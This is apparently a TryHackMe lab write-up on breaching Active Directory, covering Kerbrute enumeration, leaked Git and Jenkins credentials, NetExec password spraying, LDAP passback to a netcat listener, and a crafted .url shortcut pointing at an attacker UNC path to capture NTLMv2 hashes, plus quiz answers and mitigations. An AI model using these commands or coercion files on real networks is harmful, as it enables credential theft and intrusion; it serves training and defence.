# AD Breaching-TryHackMe

[![Target: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![OS: Linux](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white)](#)
[![Difficulty: Beginner/Intermediate](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](#)
[![Category: Active Directory](https://img.shields.io/badge/Category-Active%20Directory-purple?style=for-the-badge)](#)

## TryHackMe-AD Breaching

 # Executive Summary

 This room introduces the concept of **breaching an Active Directory (AD) environment** from an unauthenticated starting position.

 The objective is to obtain the first valid set of domain credentials. Once valid credentials have been obtained, an attacker can authenticate to the environment and begin deeper enumeration, lateral movement, and privilege escalation.

 The attack progression covered in this room is:

1. VPN and environment configuration
2. AD reconnaissance
3. OSINT-based username discovery
4. Kerberos username enumeration with Kerbrute
5. Credential discovery from Git and Jenkins
6. Password spraying with NetExec
7. LDAP passback against a network printer
8. File-based authentication coercion
9. Offline password cracking
10. Defensive mitigations

 The room demonstrates an important penetration-testing principle:

 > **Initial access is often obtained by combining several small weaknesses rather than exploiting one critical vulnerability.**

---

 # 1: Lab Setup

 ## Create a Working Directory

 Create a dedicated directory for all files associated with the room:

```
mkdir Intro_to_AD_Breaching
cd Intro_to_AD_Breaching
```

 Copy the downloaded VPN configuration into the directory:

```
cp ~/Downloads/ad-breach-6ac40f9538d14bfdf244cdcc.ovpn .
```

 Verify:

```
ls
```

 Connect to the TryHackMe VPN:

```
sudo openvpn ad-breach-6ac40f9538d14bfdf244cdcc.ovpn
```

 Keep the VPN connection running while completing the room.

---

 ## Configure `/etc/hosts`

 The lab provides several internal hostnames that need to resolve correctly.

 Edit the hosts file:

```
sudo nano /etc/hosts
```

 Add:

```
192.168.12.100    thm.loc
192.168.12.71     git.thm.loc
192.168.12.71     ci.thm.loc
192.168.12.71     printer.thm.loc
192.168.12.51     SERVER1.thm.loc
```

 After saving, verify name resolution:

```
ping -c 1 thm.loc
ping -c 1 git.thm.loc
```

---

 # Task 2. Understanding Active Directory Breaching

 ## What Is Breaching?

 In an AD penetration test, **breaching** refers to obtaining the initial valid domain credentials needed to enter the authenticated portion of the environment.

 The attacker may initially have:

 - Network access
- No username
- No password
- No domain credentials

 The objective is therefore to discover or obtain a valid credential pair.

 Once authenticated, significantly more information becomes available.

---

 ## Why Initial Credentials Matter

 A low-privileged domain account may initially appear uninteresting.

 However, authentication can provide access to information about:

 - Users
- Groups
- Computers
- Group Policy
- Domain structure
- Shares
- Trust relationships
- Internal services

 This information can expose additional attack paths.

 Therefore, the first credential should be viewed as a **foothold**, rather than the final objective.

---

 # Active Directory Attack Surface

 Several protocols are particularly important during initial reconnaissance.

 | Protocol | Port | Relevance |
| --- | --- | --- |
| SMB | TCP 445 | Shares and authentication |
| LDAP | TCP 389 | Directory queries |
| LDAPS | TCP 636 | Encrypted LDAP |
| Kerberos | TCP/UDP 88 | AD authentication |
| DNS | TCP/UDP 53 | Domain infrastructure discovery |
| HTTP/HTTPS | TCP 80/443 | Web applications and management interfaces |

Kerberos is especially important because its authentication behaviour can be used to determine whether usernames exist in the domain.

---

 # Task 3-OSINT and Target Reconnaissance

 ## Objective

 Before performing active attacks, attackers commonly collect information about the target organisation.

 Potential sources include:

 - Corporate websites
- LinkedIn
- GitHub/GitLab
- Job advertisements
- Public breach datasets
- Technical documentation

 The goal is to identify:

 1. Employee names
2. Username conventions
3. Email formats
4. Technologies in use
5. Potential accounts

---

 ## Common Username Formats

 Organisations frequently use predictable naming conventions.

 For example, for an employee named Jane Smith:

 | Format | Example |
| --- | --- |
| First.Last | `jane.smith` |
| FirstLast | `janesmith` |
| First initial + Last | `jsmith` |
| First initial + Last name | `jsmith` |
| First | `jane` |
| Last.First | `smith.jane` |

Identifying the correct format makes username enumeration significantly more efficient.

---

 # Kerberos Username Enumeration

 ## Installing Kerbrute

 First determine whether Kerbrute is already installed:

```
which kerbrute
```

 If it is unavailable, install it:

```
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build -o kerbrute .
sudo mv kerbrute /usr/local/bin/
```

 Verify:

```
which kerbrute
```

---

 ## Enumerating Valid Users

 Using the supplied username list:

```
kerbrute userenum -d thm.loc --dc 192.168.12.100 usernames.txt
```

 ### Command breakdown

```
userenum
```

 Performs username enumeration.

```
-d thm.loc
```

 Specifies the target AD domain.

```
--dc 192.168.12.100
```

 Specifies the domain controller.

```
usernames.txt
```

 Contains the candidate usernames.

---

 ## Why Kerbrute Works

 Kerbrute takes advantage of differences in Kerberos responses.

 For an invalid account, the domain controller can return:

```
KDC_ERR_C_PRINCIPAL_UNKNOWN
```

 For an existing account, the response indicates that the account exists and requires pre-authentication.

 This allows an attacker to distinguish valid usernames without knowing their passwords.

 Importantly, these requests are not equivalent to repeatedly submitting incorrect passwords, so they do not normally cause traditional account lockouts.

 However, Kerberos authentication requests can still generate Windows security events, including **Event ID 4768**.

---

 ## Result

 The room reports:

```
42 valid usernames
```

 > **Lab note:** The practical output may display 43 results because of an issue in the room content. The expected answer is **42**.

 **Q: How many valid usernames did Kerbrute discover?**

 **Answer: 42**

 ### Username format

 **Q: What is the organisation's username format?**

 **Answer: `first.last`**

---

 # DNS Enumeration

 DNS is extremely important in Active Directory because AD depends heavily on DNS.

 Useful queries include:

```
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
```

 Kerberos:

```
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
```

 Mail:

```
nslookup -type=MX thm.loc 192.168.12.100
```

 These queries can reveal important infrastructure such as:

 - Domain controllers
- Kerberos services
- LDAP services
- Mail servers

---

 # Task 4-Credential Discovery

 Obtaining credentials from exposed internal services is often easier than directly attacking authentication.

 This technique falls broadly under **Unsecured Credentials**, associated with MITRE ATT&CK technique **T1552**.

 Potential sources include:

 - Git repositories
- Jenkins
- CI/CD pipelines
- Configuration files
- Build logs
- Internal documentation
- Network shares

---

 # Git Credential Discovery

 The lab provides an exposed repository:

```
https://git.thm.loc/megacorp-admin/webapp-deploy
```

 The important lesson is that deleting a credential from the latest version of a file does **not** necessarily remove it from Git.

 Git maintains historical commits.

 Therefore, when investigating an exposed repository, examine:

 - Current files
- Commit history
- Configuration files
- Previous versions
- CI/CD configuration
- Environment files

 A useful local technique is:

```
git log -p
```

 and searching for terms such as:

```
password
secret
token
credential
key
```

---

 ## Credential Discovered

 The room identifies a credential for the Jenkins service account:

```
Username: svc.jenkins
Password: Jen5k1ns2025!
```

 **Q: What is the password for the `svc.jenkins` account found in Git history?**

 **Answer: `Jen5k1ns2025!`**

---

 # Jenkins Credential Discovery

 The lab also exposes Jenkins at:

```
http://ci.thm.loc/
```

 The room provides:

```
Username: admin
Password: admin
```

 After logging in, examine:

 - Jobs
- Build history
- Console output
- Environment variables
- Configuration
- Workspace files

 Build logs are particularly interesting because poorly configured pipelines may print credentials.

 The room contains a leaked default password:

```
MegaCorp01!
```

 **Q: What default password was leaked in the Jenkins build logs?**

 **Answer: `MegaCorp01!`**

---

 # Task 5-Username Enumeration and Password Spraying

 Once a valid username list has been obtained, the next technique is **password spraying**.

 ## Password Spraying vs Brute Force

 These techniques should not be confused.

 ### Brute force

 One account:

```
alice → password1
alice → password2
alice → password3
alice → password4
```

 This can quickly trigger account lockout.

 ### Password spraying

 One password:

```
alice → MegaCorp01!
bob → MegaCorp01!
charlie → MegaCorp01!
david → MegaCorp01!
```

 The attacker then moves to another password later.

 The objective is to minimise failed authentication attempts against any individual account.

---

 # Preparing the Username List

 The Kerbrute output can be cleaned with standard Linux utilities.

 For example:

```
awk '{print $NF}' user.txt
```

 Save the output:

```
awk '{print $NF}' user.txt > users.txt
```

 If the output contains the domain suffix, remove it:

```
awk -F'@' '{print $1}' users.txt > user.txt
```

 Review the result:

```
cat user.txt
```

---

 # Checking the Password Policy

 If valid credentials have already been obtained, determine the domain password policy before spraying.

 Example:

```
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

 Understanding the lockout policy is critical.

 A tester should avoid blindly spraying large numbers of passwords.

---

 # Password Spray with NetExec

 The lab uses the leaked onboarding password:

```
MegaCorp01!
```

 The spray command is:

```
nxc smb 192.168.12.100 -u user.txt -p 'MegaCorp01!' --continue-on-success
```

 ### Parameters

 | Parameter | Meaning |
| --- | --- |
| `smb` | Use SMB authentication |
| `192.168.12.100` | Target domain controller |
| `-u user.txt` | Username wordlist |
| `-p` | Password to test |
| `--continue-on-success` | Continue after finding a valid account |

---

 # Understanding NetExec Results

 Important responses include:

```
[+]
```

 Successful authentication.

```
[-] STATUS_LOGON_FAILURE
```

 Invalid credentials.

```
STATUS_ACCOUNT_DISABLED
```

 The account exists but is disabled.

```
STATUS_ACCOUNT_LOCKED_OUT
```

 The account is locked and spraying should stop.

```
Pwn3d!
```

 The authenticated account has administrative privileges on the target system.

---

 ## Results

 The room reports:

```
2 accounts
```

 were successfully compromised through the password attack.

 The first account alphabetically using the default onboarding password is:

```
alice.moore
```

 **Q: How many accounts were cracked?**

 **Answer: 2**

 **Q: Which is the first user account alphabetically that uses the default onboarding password?**

 **Answer: `alice.moore`**

---

 # Task 6- Coercion Attack

 Authentication coercion is different from password discovery or password spraying.

 Instead of guessing or discovering a password, the attacker attempts to make a victim system **authenticate to an attacker-controlled system**.

 This is associated with MITRE ATT&CK **T1187 — Forced Authentication**.

 This room demonstrates two techniques:

 1. LDAP passback
2. File-based coercion

---

 # LDAP Passback

 Network printers and multifunction devices frequently integrate with LDAP.

 For example, a printer may use an LDAP service account to:

 - Query the directory
- Search an address book
- Authenticate users
- Retrieve directory information

 If the device allows its LDAP server to be changed, an attacker may redirect it to an attacker-controlled listener.

---

 # Printer Attack

 Navigate to:

```
http://printer.thm.loc/
```

 The room provides:

```
Username: admin
Password: admin
```

 Locate the LDAP configuration.

 The configuration contains a service account and LDAP server details.

 Change the LDAP server to the attacker's `tun0` IP address.

 For example:

```
LDAP Server: <YOUR_TUN0_IP>
Port: 3489
```

 Save the configuration.

---

 # Start the LDAP Listener

 On the attacker machine:

```
nc -lvnp 3489
```

 Trigger the printer's LDAP connection test.

 The printer connects to the attacker's machine.

 Because the lab uses plaintext LDAP, the authentication information can be observed by the listener.

---

 # LDAP Passback Result

 The captured Bind DN is:

```
CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
```

 The captured password is:

```
Pr1ntBind2025!
```

 The credentials can then be tested against SMB:

```
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'Pr1ntBind2025!'
```
 **Bind DN:**

```
CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
```

 **Password:**

```
Pr1ntBind2025!
```

---

 # File-Based Authentication Coercion

 The second coercion technique abuses Windows behaviour when users browse files on a network share.

 Certain shortcut files can reference remote UNC paths.

 For example:

```
\\ATTACKER_IP\icons\icon.ico
```

 When Windows attempts to retrieve the icon, the victim machine may initiate SMB authentication to the attacker.

 This can expose an NTLMv2 challenge-response.

---

 # Creating the Malicious `.url` File

 Create the shortcut:

```
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
IconIndex=1
EOF
```

 Replace:

```
YOUR_TUN0_IP
```

 with the IP address of the attacker's `tun0` interface.

 The important line is:

```
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
```

 This is what causes Windows to attempt the remote SMB connection.

---

 # Start Responder

 Start Responder on the VPN interface:

```
sudo responder -I tun0
```

 Responder listens for authentication attempts and can capture NTLM challenge-response material.

---

 # Upload the Shortcut

 Connect to the writable SMB share:

```
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
```

 Upload the file:

```
put @Shortcut.url
```

 Then:

```
exit
```

 The simulated user periodically accesses the share.

 When Windows attempts to render the shortcut's icon, authentication is triggered toward the attacker's system.

 Responder should capture the NTLMv2 challenge-response.

---

 # Offline Password Cracking

 Save the captured hash:

```
nano hash.txt
```

 Verify:

```
cat hash.txt
```

 The room then uses an offline password-cracking process to recover the password.

 The recovered password is:

```
Trustno1
```

 **Q: What is the cracked password for `sarah.jones`?**

 **Answer: `Trustno1`**

---

 # Advanced Coercion Techniques

 The room briefly introduces additional techniques that are beyond its primary scope.

 Examples include:

 - PetitPotam
- PrinterBug / SpoolSample
- DFSCoerce
- NTLM relay attacks

 The important concept is that authentication coercion can become significantly more powerful when combined with **NTLM relay**.

 Instead of:

```
Victim → Attacker → Crack password
```

 an attacker may potentially use:

```
Victim → Attacker → Relay authentication → Target
```

 This can allow authentication material to be used directly against another service.

---

 # Task 7-Mitigation

 Understanding how an attack works is only half of the security process.

 Every technique demonstrated in this room has corresponding defensive controls.

---

 ## Secrets Management

 Do not store credentials in:

 - Source code
- Git history
- `.env` files
- Build logs
- Configuration files
- Documentation

 Use dedicated secrets-management systems where appropriate.

 Organisations should also:

 - Scan repositories for secrets
- Use pre-commit secret detection
- Audit Git history
- Rotate exposed credentials immediately
- Restrict CI/CD log access
- Prevent credentials from being printed in build output

 Removing a password from the latest Git commit is **not sufficient** if the password remains in historical commits.

---

 # Password Policy

 Organisations should avoid predictable passwords such as:

```
CompanyName01!
CompanyName2025!
Summer2025!
```

 Defensive recommendations include:

 - Long passwords/passphrases
- Banned-password lists
- Unique initial passwords
- No organisation-wide default passwords
- Appropriate account lockout policies
- Monitoring distributed authentication failures

 Password spraying should be detected by looking for authentication failures across **many different accounts**, rather than only watching for repeated failures against one account.

---

 # Printer and Device Hardening

 Printers and multifunction devices should be treated as networked computers.

 Recommended controls:

 - Change default administrator credentials
- Use LDAPS instead of plaintext LDAP
- Restrict printer management interfaces
- Segment printers into appropriate VLANs
- Use dedicated low-privilege service accounts
- Avoid privileged AD accounts for device integrations
- Rotate service-account credentials
- Maintain accurate device inventories

---

 # File Share Security

 The file coercion attack depended on a writable share.

 Defensive controls include:

 - Least-privilege share permissions
- Restricting write access
- Monitoring unusual file creation
- Detecting `.url`, `.lnk`, `.scf`, and similar files
- Monitoring unexpected SMB authentication attempts

 Users should not have unnecessary write permissions to shared directories.

---

 # NTLM Hardening

 NTLM should be reduced or eliminated wherever practical.

 One important Group Policy setting is:

```
Network Security:
LAN Manager authentication level
```

 The objective is to enforce NTLMv2 and refuse older authentication mechanisms.

 The room's answer is:

 **Network Security: LAN Manager authentication level**

 Additional protections include:

 - Disable NTLMv1
- Enforce SMB signing
- Restrict outbound SMB
- Monitor NTLM authentication
- Work toward NTLM deprecation
- Prefer stronger modern authentication mechanisms

---

 # LDAP Encryption

 Plaintext LDAP uses:

```
TCP 389
```

 Encrypted LDAP uses:

```
TCP 636
```

 Therefore, the room's answer is:

 **636**

 Using encrypted LDAP prevents simple plaintext credential capture during a passback scenario.

---

 # Network Segmentation

 Internal services should not automatically be accessible from every network segment.

 Management interfaces such as:

 - Jenkins
- Git servers
- Printer administration
- Device management
- Administrative portals

 should be restricted to appropriate networks or management VLANs.

 MFA should also be implemented for:

 - Internet-facing services
- VPN
- Email
- Administrative portals
- Other high-value authentication points

---

 # Task 8-Final Attack Chain

 The complete attack progression can be represented as:

```
                     ┌─────────────────────┐
                     │ Network Access      │
                     └──────────┬──────────┘
                                │
                                ▼
                     ┌─────────────────────┐
                     │ Reconnaissance      │
                     │ OSINT + DNS         │
                     └──────────┬──────────┘
                                │
                                ▼
                     ┌─────────────────────┐
                     │ Username Enumeration│
                     │ Kerbrute            │
                     └──────────┬──────────┘
                                │
                                ▼
                 ┌──────────────┴──────────────┐
                 │                             │
                 ▼                             ▼
       ┌─────────────────┐           ┌─────────────────┐
       │ Credential       │           │ Password        │
       │ Discovery        │           │ Spraying        │
       │ Git / Jenkins    │           │ NetExec         │
       └────────┬────────┘           └────────┬────────┘
                │                             │
                └──────────────┬──────────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Valid AD Credentials│
                    └──────────┬──────────┘
                               │
                               ▼
                  ┌─────────────────────────┐
                  │ Authentication Coercion │
                  ├─────────────────────────┤
                  │ LDAP Passback            │
                  │ File-based Coercion     │
                  └────────────┬────────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Additional          │
                    │ Credentials / Hashes│
                    └─────────────────────┘
```

 # Key Lessons

 The most important lessons from this room are:

 ### 1\. Reconnaissance comes first

 Before attacking authentication, understand the environment.

 ### 2\. Usernames are valuable

 Knowing which accounts exist significantly reduces the search space for credential attacks.

 ### 3\. Kerberos can leak account existence

 Kerberos behaviour can be used to validate usernames without knowing their passwords.

 ### 4\. Credentials are frequently exposed accidentally

 Git repositories, CI/CD systems and build logs can contain extremely valuable secrets.

 ### 5\. Password spraying exploits human behaviour

 Password complexity requirements do not prevent predictable passwords.

 ### 6\. Network devices are part of the attack surface

 Printers, scanners and other embedded devices can contain AD credentials.

 ### 7\. Authentication itself can be coerced

 Attackers do not always need to know a password. Sometimes they can cause a system to authenticate to them.

 ### 8\. NTLM remains a significant attack surface

 Captured NTLM authentication can potentially be cracked or relayed.

 ### 9\. Least privilege matters everywhere

 The damage caused by a compromised service account depends heavily on the privileges assigned to it.

 ### 10\. Initial access is a chain

 The most important takeaway is that AD compromise frequently looks like:

```
Recon
  ↓
Username discovery
  ↓
Credential discovery
  ↓
Password spraying
  ↓
Valid credentials
  ↓
Authentication coercion
  ↓
More credentials
  ↓
Deeper AD attack
```

---

 # Conclusion

 The AD Breaching room demonstrates how an attacker can progress from **zero credentials** toward authenticated access by combining reconnaissance, credential discovery, password spraying and authentication coercion.

 The techniques are individually useful, but their real power comes from combining them.

 A leaked password from Jenkins can provide the first account.

 That account can reveal additional information.

 A predictable onboarding password can compromise additional users.

 A misconfigured printer can expose a service-account password.

 A writable file share can coerce another user's machine into authenticating to an attacker.

 The result is an iterative attack cycle:

 > **Discover → Validate → Authenticate → Enumerate → Discover more credentials → Repeat**

 From a defensive perspective, the same chain highlights the importance of:

 - Strong secrets management
- Secure CI/CD practices
- Strong password policies
- Account monitoring
- Device hardening
- LDAPS
- Least privilege
- Secure file shares
- NTLM hardening
- Network segmentation
- MFA

 Ultimately, the room teaches that **Active Directory security is not dependent on a single control**. A secure environment requires multiple layers of protection so that one leaked password, misconfigured printer, exposed repository, or writable share does not become the starting point for a larger compromise.
